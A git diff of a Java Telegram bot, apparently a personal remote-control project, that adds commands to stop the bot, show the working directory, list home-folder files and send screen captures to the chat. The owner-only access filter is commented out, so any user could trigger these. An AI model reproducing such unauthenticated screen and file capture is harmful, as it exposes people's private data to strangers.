@@ -25,7 +25,7 @@ import ru.dogobot.Dogobot.config.BotConfig;
 import ru.dogobot.Dogobot.model.User;
 import ru.dogobot.Dogobot.model.UserRepository;
 
-import java.io.File;
+import java.io.*;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -43,12 +43,13 @@ public class TelegramBot extends TelegramLongPollingBot {
     //команды меню
     @Getter  @AllArgsConstructor
     public enum BotMenuEnum {
-        START("/start", "Здравствуйте!"),
-        SHOWDIR("/showdir", "Показать содержимое папки"),
-        MYDATA("/mydata", "Посмотреть данные о себе"),
-        DELETEDATA("/deletedata", "Удалить данные о себе"),
-        HELP("/help", "Помощь"),
-        SETTINGS("/settings", "Настройки");
+        START(      "/start",       "Здравствуйте!"),
+        SHOWDIR(    "/showdir",     "Показать содержимое папки"),
+        MYDATA(     "/mydata",      "Посмотреть данные о себе"),
+        DELETEDATA( "/deletedata",  "Удалить данные о себе"),
+        HELP(       "/help",        "Помощь"),
+        SETTINGS(   "/settings",    "Настройки"),
+        EXIT(       "/botstop",     "Остановить бота");
 
         private final String key;
         private final String description;
@@ -65,6 +66,9 @@ public class TelegramBot extends TelegramLongPollingBot {
 
     @Autowired
     private UserRepository userRepository;
+
+    @Autowired
+    private Screenshoter screenshoter;
 
     public TelegramBot(BotConfig botConfig) {
         this.botConfig = botConfig;
@@ -100,14 +104,16 @@ public class TelegramBot extends TelegramLongPollingBot {
     @Override
     public void onUpdateReceived(Update update) {
         //if (!ownerFilter(update)) return;
-        if (update.hasMessage() && update.getMessage().hasText()) {         //Если прилетел текст
+        if (update.hasMessage() && update.getMessage().hasText()) {             //Если прилетел текст
             handlerText(update);
-        } else if (update.hasCallbackQuery()) {                             //Если прилетел CallbackQuery
+        } else if (update.hasCallbackQuery()) {                                 //Если прилетел CallbackQuery
             handlerCallBackQuery(update);
+        //todo можно добавить сохранение присланных файлов, но придется для каждого типа файла (музка, видео и т.п.) делать отдельный метод
         } else {
             log.error("Не могу распознать отправленную информацию: " + update);
         }
     }
+
     /**
      * Фильтр для блокировки бота для всех, кроме владельца
      * @param update объект обновления
@@ -121,6 +127,7 @@ public class TelegramBot extends TelegramLongPollingBot {
         );
     }
 
+    //region Обработчики входной информации
     /**
      * Обработчик текстовых сообщений
      * @param update объект обновления
@@ -141,6 +148,10 @@ public class TelegramBot extends TelegramLongPollingBot {
         } else if (messageText.equals(BotMenuEnum.DELETEDATA.getKey())) {
             sendMessageWithoutKeyboard(chatId, "Запрошено удаление данных о себе");
 
+        } else if (messageText.equals(BotMenuEnum.EXIT.getKey())) {
+            sendMessageWithoutKeyboard(chatId, "Всё, выключаю бота на том устройстве");
+            System.exit(0);
+
         } else {
             sendMessageWithoutKeyboard(chatId, "Прислано " + messageText);
         }
@@ -159,6 +170,18 @@ public class TelegramBot extends TelegramLongPollingBot {
             String text = "You pressed YES button";
             editMessageWithoutKeyboard(chatId, messageId, text);
 
+            // получаем текущую директорию
+            String line = null;
+            try {
+                Process process = Runtime.getRuntime().exec("pwd");
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                line = reader.readLine();
+                reader.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            sendMessageWithoutKeyboard(chatId, line);
+
             //todo начальные эксперименты с движением по файловой системе
             List<String> fileNames = new ArrayList<>();
             // Получаем домашнюю папку пользователя
@@ -172,6 +195,11 @@ public class TelegramBot extends TelegramLongPollingBot {
                 fileNames.add(file.getName());
             }
             sendMessageWithoutKeyboard(chatId, fileNames.toString());
+
+            //сделать скриншот экрана
+            String screenPath = screenshoter.take();
+            sendFile(chatId, screenPath);
+
         }
         else if(callbackData.equals("NoCD")){
             String text = "You pressed NO button";
@@ -181,6 +209,8 @@ public class TelegramBot extends TelegramLongPollingBot {
             log.error("Не распознал callbackData: " + callbackData);
         }
     }
+
+    //endregion
 
     /**
      * Обработчик команды /start
